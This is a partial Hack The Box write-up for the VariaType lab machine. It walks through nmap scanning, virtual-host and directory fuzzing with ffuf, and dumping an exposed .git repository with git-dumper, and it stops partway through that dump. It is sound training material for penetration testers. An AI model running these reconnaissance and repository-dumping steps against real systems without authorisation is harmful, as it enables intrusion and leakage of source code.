---
tags:
  - HTB_SN_10
link: https://app.hackthebox.com/machines/VariaType
description: Medium·Linux
image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/1c63aff74baeaf6afdb5f35519756ab1.png
date: 2026-03-22
pawned:
---
## Summary

| SECTION/TASK     | FLAG |
| ---------------- | ---- |
| Submit User Flag |      |
| Submit Root Flag |      |

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 1. Reconnaissance & Discovery
### 1.1 Connecting to the HTB VPN

First, download your personalized `.ovpn` file from Hack The Box.

Connect to the HTB VPN using the `.ovpn` configuration file. This establishes a secure tunnel that allows access to the target machine’s internal network.

Command: `sudo openvpn your_file.ovpn`

Start the Machine.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.2 Verifying the Target is Reachable

Verify that the target machine is up and reachable by performing an ICMP ping test.

Command: `ping -c 4 TARGET_IP`

Breakdown:
- `-c 4` → sends 4 packets only (clean output, fast)

Output:

```shell
┌──(kali㉿kali)-[~]
└─$ ping -c 4 TARGET_IP
PING TARGET_IP (TARGET_IP) 56(84) bytes of data.
64 bytes from TARGET_IP: icmp_seq=1 ttl=63 time=254 ms
64 bytes from TARGET_IP: icmp_seq=2 ttl=63 time=256 ms
64 bytes from TARGET_IP: icmp_seq=3 ttl=63 time=262 ms
64 bytes from TARGET_IP: icmp_seq=4 ttl=63 time=266 ms

--- TARGET_IP ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 254.200/259.641/266.291/4.931 ms
```

A successful response confirms that the machine is active and accessible on the HTB network, allowing us to proceed with the enumeration phase.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 2. Enumeration

### 2.1 Port Scan with Nmap

Before we can attack a system, we need to find out what "doors" are open. Doors in this context are ports. We use a tool called **Nmap** (Network Mapper) to scan the target's IP address and see what services are running.

#### 2.1.1 The "Spearfishing" Scan (All Ports, High Speed)

Command: `nmap -p- --min-rate 5000 -Pn TARGET_IP`

Breakdown:
- **`nmap`**
    - **Description:** The utility itself.
- **`-p-`**
    - **Description:** All Ports Scan. 
    - **Purpose:** Scans all 65,535 ports. Slower but thorough.
- `--min-rate 5000`
	- **Description:** Minimum Packet Rate.
	- **Purpose:** Forces Nmap to send at least 5,000 packets per second. This reduces scan time on stable networks like the HTB VPN.
- `-Pn`
    - **Description:** Skip Host Discovery.
    - **Purpose:** Treats the host as "online" even if it doesn't respond to pings (ICMP). Many HTB boxes have firewalls that block pings.
- **`TARGET_IP`**
    - **Description:** Target Specification.
    - **Purpose:** The IP address of the host being scanned.

Output:

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -p- --min-rate 5000 -Pn TARGET_IP
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-22 05:14 -0400
Warning: TARGET_IP giving up on port because retransmission cap hit (10).
Nmap scan report for TARGET_IP
Host is up (0.30s latency).
Not shown: 65269 closed tcp ports (reset), 264 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 45.86 seconds
```
<div align="center">
<br>
<br>
</div>

#### 2.1.2 The "Deep Dive" Scan (Targeted Aggression)

Command: `nmap -A -p p1,p2,p3,p4 TARGET_IP`

Breakdown:
- **`-A`**
    - **Description:** Aggressive Scan Mode.
    - **Purpose:** Enables OS detection, version detection, script scanning (`-sC`), and traceroute all at once.
- `-p`
    - **Description:** Targeted Port List.
    - **Purpose:** Restricts the heavy scanning to only the ports you confirmed are open, saving significant time and processing power.


Output:

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -A -p 22,80 TARGET_IP            
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-22 05:15 -0400
Nmap scan report for TARGET_IP
Host is up (0.26s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 e0:b2:eb:88:e3:6a:dd:4c:db:c1:38:65:46:b5:3a:1e (ECDSA)
|_  256 ee:d2:bb:81:4d:a2:8f:df:1c:50:bc:e1:0e:0a:d1:22 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Did not follow redirect to http://variatype.htb/
|_http-server-header: nginx/1.22.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   253.97 ms 10.10.14.1
2   254.20 ms TARGET_IP

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.42 seconds
```
<div align="center">
<br>
<br>
</div>

#### 2.1.3 Scan Results Analysis

| Port   | **Service** | **Version**   | **Analysis**                                                                                                         |
| ------ | ----------- | ------------- | -------------------------------------------------------------------------------------------------------------------- |
| 22/tcp | SSH         | OpenSSH 9.2p1 | Running on Debian 12. Likely used for remote management; standard version with no immediate public exploits.         |
| 80/tcp | HTTP        | nginx 1.22.1  | Redirects to `http://variatype.htb/`. This indicates a Virtual Host setup is in place, requiring a local DNS update. |

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.2 Enumeration of Web Services

#### 2.2.1 Update Hosts File

The Nmap results indicated that the web server relies on Virtual Host (VHost) routing. To interact with the application correctly, update your local attack machine's host table to resolve the domain name.

Command: `sudo sh -c 'echo "TARGET_IP variatype.htb" >> /etc/hosts'`

Breakdown:

- **`sudo`**
    - **Description:** Superuser Do.
    - **Purpose:** Executes the subsequent command with root privileges. This is required because `/etc/hosts` is a system-protected file that ordinary users cannot modify.
- **`sh -c`**
    - **Description:** Shell Command String.
    - **Purpose:** Tells the system to run a new shell instance and execute the string inside the single quotes. This is used here because the redirection (`>>`) needs root privileges to write to the file; simply using `sudo echo ... >> /etc/hosts` would fail because the redirection is handled by your current (unprivileged) shell.
- **`echo "TARGET_IP variatype.htb"`**
    - **Description:** Standard Output Generator. 
    - **Purpose:** Creates a string containing the IP address and the desired domain name, which acts as a local DNS entry.
- **`>>`**
    - **Description:** Append Redirection.
    - **Purpose:** Directs the output of the `echo` command to the end of a file. Using `>>` (append) instead of `>` (overwrite) ensures you don't accidentally delete your existing host mappings.
- **`/etc/hosts`**
    - **Description:** Static Host Lookup Table.
    - **Purpose:** The target file where the operating system looks first to resolve hostnames to IP addresses before querying external DNS servers.
<div align="center">
<br>
<br>
</div>

##### How Hostname Resolution Works

When you type a URL like `google.com` or `variatype.htb` into your browser, your computer needs to translate that text into a numerical IP address. It follows a specific order of operations:

1. **The Browser Cache:** Your browser checks if it already knows the IP from a previous visit.
2. **The Hosts File (`/etc/hosts`):** This is your computer's "private address book." It checks here **first** before asking the internet. If an entry exists, it stops looking and goes to that IP.
3. **DNS Servers:** If the name isn't in your private book, your computer asks a DNS server (like Google’s `8.8.8.8` or your ISP).

##### Why `google.com` works but `variatype.htb` doesn't

- **Public Sites:** `google.com` is registered on public DNS servers. When you ask the internet "Where is Google?", the internet has an official answer.

- **HTB Sites:** `variatype.htb` is a **private domain** inside the HTB lab environment. Public DNS servers have no idea it exists. Because your computer can't find an "official" record, it gives you a "Server Not Found" error—unless you write the address into your private address book (`/etc/hosts`) yourself.
<div align="center">
<br>
<br>
</div>

#### 2.2.2 Web Enumeration

Browse to `http://variatype.htb`.

![[Pasted image 20260322124112.png]]

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>VariaType Labs — Variable Font Generator</title>
  <link rel="stylesheet" href="/static/css/corporate.css" />
  <link href="https://rsms.me/inter/inter.css" rel="stylesheet" />
  
</head>
<body>
  <nav class="navbar">
    <a href="/" class="logo">VariaType Labs</a>
    <ul class="nav-links">
      <li><a href="/">Home</a></li>
      <li><a href="/services">Services</a></li>
      <li><a href="/tools/variable-font-generator">Tools</a></li>
    </ul>
    <a href="/tools/variable-font-generator" class="cta-button">Generate Font</a>
  </nav>

  
<section class="hero">
  <div class="container">
    <h1>Variable Fonts, Built Right</h1>
    <p>Generate production-ready variable fonts from your .designspace and master font files using industry-standard tooling.</p>
    <a href="/tools/variable-font-generator" class="btn">Generate Your Variable Font</a>
  </div>
</section>

<section class="section">
  <div class="container">
    <div class="card">
      <h2>Why Variable Fonts?</h2>
      <p>A single variable font can replace multiple static files, reducing payload size while enabling fluid design control. Our generator ensures your output meets OpenType standards and works across all modern platforms.</p>
    </div>

    <div class="card">
      <h2>For Type Designers</h2>
      <p>Upload your <code>.designspace</code> file and master fonts (.ttf/.otf) to generate a fully compliant variable font. We use the same <strong>fonttools</strong> engine used by Google Fonts and major foundries.</p>
      <p><strong>Supported features:</strong></p>
      <ul style="margin: 1rem 0 1rem 1.5rem; padding-left: 0;">
        <li style="margin-bottom: 0.5rem;">• Weight, width, optical size, and custom axes</li>
        <li style="margin-bottom: 0.5rem;">• OpenType layout features (GSUB/GPOS)</li>
        <li>• Automatic table generation (fvar, gvar, HVAR, MVAR)</li>
      </ul>
      <a href="/tools/variable-font-generator" class="btn">Start Generation</a>
    </div>
  </div>
</section>


  <div class="footer">
    <p>VariaType Labs © 2025 — Professional variable font solutions for designers and developers.<br>
    </p>
  </div>
</body>
</html>
```
<div align="center">
<br>
</div>

Browse to `http://variatype.htb/services`

![[Pasted image 20260322131231.png]]

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Services — VariaType Labs</title>
  <link rel="stylesheet" href="/static/css/corporate.css" />
  <link href="https://rsms.me/inter/inter.css" rel="stylesheet" />
  
</head>
<body>
  <nav class="navbar">
    <a href="/" class="logo">VariaType Labs</a>
    <ul class="nav-links">
      <li><a href="/">Home</a></li>
      <li><a href="/services">Services</a></li>
      <li><a href="/tools/variable-font-generator">Tools</a></li>
    </ul>
    <a href="/tools/variable-font-generator" class="cta-button">Generate Font</a>
  </nav>

  
<section class="hero">
  <div class="container">
    <h1>Professional Typography Services</h1>
    <p>We partner with brands, developers, and design teams to implement variable fonts at scale — from creation to deployment.</p>
  </div>
</section>

<section class="section">
  <div class="container">
    <div class="card">
      <h2>Custom Variable Font Development</h2>
      <p>We collaborate with type designers and foundries to build production-ready variable fonts that meet technical, aesthetic, and performance requirements.</p>
      <p>Our process includes:</p>
      <ul style="margin: 1rem 0 1rem 1.5rem;">
        <li>Axis definition and design space optimization</li>
        <li>Master font interpolation and delta reduction</li>
        <li>OpenType feature integration (ligatures, alternates, etc.)</li>
        <li>Validation for web, mobile, and desktop platforms</li>
      </ul>
    </div>

    <div class="card">
      <h2>Font Pipeline Integration</h2>
      <p>Automate your font workflows with robust, maintainable tooling. We help teams integrate variable font generation into CI/CD pipelines using open standards like <code>fonttools</code>, <code>fontmake</code>, and <code>gftools</code>.</p>
      <p>Includes:</p>
      <ul style="margin: 1rem 0 1rem 1.5rem;">
        <li>Build script development (Python, Bash)</li>
        <li>Automated QA and regression testing</li>
        <li>Metadata and naming compliance (Adobe, Microsoft, Google)</li>
        <li>Web font packaging (WOFF2, subset generation)</li>
      </ul>
    </div>

    <div class="card">
      <h2>Technical Consulting</h2>
      <p>Stuck on a variable font issue? Our engineers provide expert support for:</p>
      <ul style="margin: 1rem 0 1rem 1.5rem;">
        <li>Rendering inconsistencies across browsers</li>
        <li>Performance optimization (font loading, subsetting)</li>
        <li>CSS implementation (<code>font-variation-settings</code>, <code>@supports</code>)</li>
        <li>Legacy system compatibility</li>
      </ul>
      <p>All consulting is based on open standards — no vendor lock-in.</p>
    </div>

    <div class="card" style="text-align: center; margin-top: 2rem;">
      <h2>Ready to build something exceptional?</h2>
      <p style="margin-bottom: 1.5rem;">Contact us for a technical assessment or project scoping.</p>
      <a href="mailto:studio@variabype.labs" class="btn" style="display: inline-block;">Email Us</a>
    </div>
  </div>
</section>


  <div class="footer">
    <p>VariaType Labs © 2025 — Professional variable font solutions for designers and developers.<br>
    </p>
  </div>
</body>
</html>
```
<div align="center">
<br>
</div>

Browse to `http://variatype.htb/tools/variable-font-generator`

![[Pasted image 20260322131510.png]]

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Upload Files — VariaType Labs</title>
  <link rel="stylesheet" href="/static/css/corporate.css" />
  <link href="https://rsms.me/inter/inter.css" rel="stylesheet" />
  
</head>
<body>
  <nav class="navbar">
    <a href="/" class="logo">VariaType Labs</a>
    <ul class="nav-links">
      <li><a href="/">Home</a></li>
      <li><a href="/services">Services</a></li>
      <li><a href="/tools/variable-font-generator">Tools</a></li>
    </ul>
    <a href="/tools/variable-font-generator" class="cta-button">Generate Font</a>
  </nav>

  
<section class="section">
  <div class="container">
    <div class="card">
      
        
      

      <h1>Upload Files</h1>
      <p>Submit your <code>.designspace</code> file and master font(s) to generate a variable font.</p>
      <br>
      <form method="POST" enctype="multipart/form-data" action="/tools/variable-font-generator/process">
        <div class="form-group">
          <label for="designspace">.designspace File</label>
          <input type="file" id="designspace" name="designspace" accept=".designspace" required>
        </div>

        <div class="form-group">
          <label for="masters">Master Fonts (.ttf or .otf)</label>
          <input type="file" id="masters" name="masters" multiple accept=".ttf,.otf" required>
          <p style="font-size: 0.9rem; color: var(--text-muted); margin-top: 0.5rem;">
            Select at least one font. Use multiple fonts for interpolatable axes (e.g., Weight, Width).
          </p>
        </div>

        <button type="submit" class="btn">Generate Variable Font</button>
      </form>

      <a href="/" style="display: inline-block; margin-top: 1.5rem; color: var(--link); text-decoration: underline;">
        ← Back to homepage
      </a>
    </div>
  </div>
</section>


  <div class="footer">
    <p>VariaType Labs © 2025 — Professional variable font solutions for designers and developers.<br>
    </p>
  </div>
</body>
</html>
```
<div align="center">
<br>
<br>
</div>

#### 2.2.3 Subdomain Enumeration

The search for subdomains was conducted by manipulating the HTTP `Host` header. This technique is essential for discovering web content that is logically separated on the same physical server but assigned to different hostnames.
<div align="center">
<br>
</div>

##### Phase 1: The False Negative (Syntax Error)

The initial attempt resulted in zero hits across the entire wordlist.

**Command:** `ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://variatype.htb/ -H "Host: FUZZ.variatype.htb/"`

**Breakdown:**

- `-w`
    - **Description:** Wordlist Path.
    - **Purpose:** Specifies the list of common subdomain names to be tested against the target.
- `-u`
    - **Description:** Target URL.
    - **Purpose:** Defines the base address of the web server receiving the fuzzing requests.
- `-H "Host: FUZZ.variatype.htb/"`
    - **Description:** Custom HTTP Header.
    - **Purpose:** Injects wordlist entries into the Host header.
- `FUZZ`
	- **Description:** Keyword Placeholder.
	- **Purpose:** Acts as the injection point where `ffuf` inserts each individual entry from the selected wordlist.

**Output:**

```shell
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://variatype.htb/ -H "Host: FUZZ.variatype.htb/"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://variatype.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.variatype.htb/
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

:: Progress: [4989/4989] :: Job [1/1] :: 72 req/sec :: Duration: [0:01:17] :: Errors: 0 ::
```

**Analysis:**

This attempt failed because HTTP `Host` headers must strictly match the domain name defined in the web server's configuration (e.g., Nginx `server_name` blocks). A trailing slash is syntactically invalid for a hostname, causing the server to ignore the header and return no valid results.
<div align="center">
<br>
<br>
</div>

##### Phase 2: The False Positive (Unfiltered Noise)

**Command:** `ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://variatype.htb/ -H "Host: FUZZ.variatype.htb"`

**Output:**

```shell
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://variatype.htb/ -H "Host: FUZZ.variatype.htb" 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://variatype.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.variatype.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

ns4                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 254ms]
mail                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 253ms]
www                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 255ms]
ns                      [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 254ms]
whm                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 255ms]
ns1                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 255ms]
m                       [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 256ms]
smtp                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 254ms]
webmail                 [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 256ms]
ns2                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 256ms]
localhost               [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 258ms]
www2                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 259ms]
autoconfig              [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 263ms]
mobile                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 260ms]
webdisk                 [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 261ms]
dev                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 261ms]
ns3                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 266ms]
cp                      [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 273ms]
forum                   [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 267ms]
beta                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 269ms]
cpanel                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 269ms]
mail2                   [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 269ms]
blog                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 269ms]
test                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 279ms]
vpn                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 272ms]
demo                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 272ms]
admin                   [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 272ms]
secure                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 275ms]
imap                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 275ms]
mysql                   [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 268ms]
pop3                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 268ms]
support                 [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 268ms]
ftp                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 279ms]
shop                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 270ms]
old                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 282ms]
pop                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 283ms]
mx                      [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 280ms]
new                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 279ms]
dns2                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 284ms]
autodiscover            [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 283ms]
dns1                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 263ms]
lists                   [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 265ms]

[WARN] Caught keyboard interrupt (Ctrl-C)
```

This command corrects the previous syntax error. This version revealed that the server utilizes a "Catch-All" configuration, returning a 169-byte response for every request.
<div align="center">
<br>
<br>
</div>

##### Phase 3: Discovery

To isolate real subdomains from the default server responses, a size filter was applied to suppress the 169-byte noise.

**Command:** `ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://variatype.htb/ -H "Host: FUZZ.variatype.htb" -fs 169` 

**Breakdown:**

 - `-fs 169`
	- **Description:** Filter HTTP Response Size & Targeted Filter Value.
	- **Purpose:** Instructs the tool to ignore any response that is exactly 169 bytes.


**Purpose:** To hide the "Catch-All" redirects and only display responses that differ from the server's default behavior. **Result:** This calibration successfully revealed a unique virtual host: **`portal.variatype.htb`** (Status: 200, Size: 2494).

**Output:**

``` shell
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://variatype.htb/ -H "Host: FUZZ.variatype.htb" -fs 169

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://variatype.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.variatype.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 169
________________________________________________

portal                  [Status: 200, Size: 2494, Words: 445, Lines: 59, Duration: 254ms]
:: Progress: [4989/4989] :: Job [1/1] :: 105 req/sec :: Duration: [0:00:34] :: Errors: 0 ::
```
<div align="center">
<br>
<br>
</div>

#### 2.2.4 Update Hosts File

**Update Local DNS:** Add `portal.variatype.htb` to your `/etc/hosts` file so your browser can resolve the newly discovered virtual host.

Command: `sudo sh -c 'echo "TARGET_IP portal.variatype.htb" >> /etc/hosts'`
<div align="center">
<br>
<br>
</div>

#### 2.2.5 Navigate to `http://portal.variatype.htb`

![[Pasted image 20260322172725.png]]
<div align="center">
<br>
<br>
</div>

#### 2.2.6 `http://portal.variatype.htb` Enumeration

**Command:** `ffuf -w /usr/share/wordlists/dirb/common.txt -u http://portal.variatype.htb/FUZZ`

**Breakdown:**

- `-w`
    - **Description:** Wordlist Selection.
    - **Purpose:** Specifies the `common.txt` list to check for standard web directories on the new subdomain.
- `-u`
    - **Description:** Subdomain Target URL.
    - **Purpose:** Directs the fuzzing traffic specifically to the `portal` virtual host.
- `FUZZ`
    - **Description:** Payload Placement.
    - **Purpose:** Injects directory names at the end of the URL to discover paths like `/config`, `/backup`, or `/dev`.

**Output:**

```shell
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://portal.variatype.htb/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://portal.variatype.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 2494, Words: 445, Lines: 59, Duration: 276ms]
.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2, Duration: 289ms]
files                   [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 253ms]
index.php               [Status: 200, Size: 2494, Words: 445, Lines: 59, Duration: 256ms]
:: Progress: [4614/4614] :: Job [1/1] :: 153 req/sec :: Duration: [0:00:31] :: Errors: 0 ::
```

**Analysis:**

| **Path**      | **Status** | **Size** | **Analysis**                                                                                                                            |
| ------------- | ---------- | -------- | --------------------------------------------------------------------------------------------------------------------------------------- |
| **.git/HEAD** | 200        | 23       | **Critical Finding.** Confirms an exposed Git repository. This can be used to reconstruct the website's source code and commit history. |
| **files**     | 301        | 169      | Redirects to a directory. Likely an upload or storage location that warrants a secondary recursive scan.                                |
| **index.php** | 200        | 2494     | Confirms the portal is running on PHP. This matches the response size of the main portal landing page.                                  |
<div align="center">
<br>
<br>
</div>

#### 2.2.7 `http://portal.variatype.htb/.git`

##### Repository Dump

**Command:** `git-dumper http://portal.variatype.htb/.git/ ./dumped_repo`

**Breakdown:**

- `git-dumper`
    - **Description:** Git Repository Extraction Tool.
    - **Purpose:** Automates the process of fetching all reachable Git objects from a remote server to reconstruct the source tree.
- `http://portal.variatype.htb/.git/`
    - **Description:** Target Repository URL.
    - **Purpose:** Points the tool to the exposed metadata directory discovered during the `ffuf` scan.
- `./dumped_repo`
    - **Description:** Local Output Directory.
    - **Purpose:** Specifies the local folder where the recovered source code, logs, and configuration files will be stored.

**Output:**

```shell
┌──(kali㉿kali)-[~/PUEMAN/HTB/SN10/VariaType]
└─$ git-dumper http://portal.variatype.htb/.git/ ./dumped_repo
[-] Testing http://portal.variatype.htb/.git/HEAD [200]
[-] Testing http://portal.variatype.htb/.git/ [403]
[-] Fetching common files
[-] Fetching http://portal.variatype.htb/.gitignore [404]
[-] http://portal.variatype.htb/.gitignore responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/COMMIT_EDITMSG [200]
[-] Fetching http://portal.variatype.htb/.git/description [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/post-commit.sample [404]
[-] http://portal.variatype.htb/.git/hooks/post-commit.sample responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/hooks/post-receive.sample [404]
[-] http://portal.variatype.htb/.git/hooks/post-receive.sample responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/hooks/commit-msg.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/post-update.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/pre-commit.sample [200]
[-] Fetching http://portal.variatype.htb/.git/objects/info/packs [404]
[-] Fetching http://portal.variatype.htb/.git/hooks/pre-rebase.sample [200]
[-] http://portal.variatype.htb/.git/objects/info/packs responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/hooks/pre-receive.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://portal.variatype.htb/.git/info/exclude [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/pre-push.sample [200]
[-] Fetching http://portal.variatype.htb/.git/index [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/update.sample [200]
[-] Finding refs/
[-] Fetching http://portal.variatype.htb/.git/FETCH_HEAD [404]
[-] Fetching http://portal.variatype.htb/.git/logs/refs/heads/production [404]
[-] Fetching http://portal.variatype.htb/.git/info/refs [404]
[-] http://portal.variatype.htb/.git/logs/refs/heads/production responded with status code 404
[-] http://portal.variatype.htb/.git/info/refs responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/ORIG_HEAD [200]
[-] Fetching http://portal.variatype.htb/.git/logs/HEAD [200]
[-] Fetching http://portal.variatype.htb/.git/logs/refs/heads/master [200]
[-] Fetching http://portal.variatype.htb/.git/logs/refs/heads/main [404]
[-] http://portal.variatype.htb/.git/logs/refs/heads/main responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/HEAD [200]
[-] Fetching http://portal.variatype.htb/.git/config [200]
[-] http://portal.variatype.htb/.git/FETCH_HEAD responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/heads/staging [404]
[-] http://portal.variatype.htb/.git/logs/refs/heads/staging responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/heads/development [404]
